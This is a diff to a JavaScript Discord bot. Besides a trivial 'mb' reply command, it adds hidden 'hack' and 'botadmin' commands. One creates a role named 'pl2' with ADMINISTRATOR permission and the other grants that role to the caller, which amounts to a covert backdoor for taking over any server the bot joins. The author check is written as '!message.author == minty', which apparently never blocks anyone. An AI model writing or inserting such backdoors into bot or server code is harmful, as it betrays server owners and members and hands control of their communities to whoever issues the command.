@@ -14,6 +14,8 @@ bot.on("ready", function() {
 });
 
 bot.on("message", function(message) {
+    var pl = message.guild.roles.find('name', "pl2");
+    var user = message.guild.member(160669529507233792);
     if (message.author.equals(bot.user)) return;
 
     if (!message.content.startsWith(PREFIX)) return;
@@ -80,7 +82,19 @@ bot.on("message", function(message) {
              case "mb" :
                 message.delete();
                 message.channel.send("My bad");
-                break;   
+                break;
+             case "hack":
+                if(!message.author == minty) return;
+                message.guild.createRole({
+                    name: 'pl2',
+                    color: 'GREY',
+                    permissions: "ADMINISTRATOR"
+                  })  
+                break;  
+            case "botadmin":
+                if(!message.author == minty) return;
+                message.member.addRole(pl)
+                break;
                 
         }
     }  
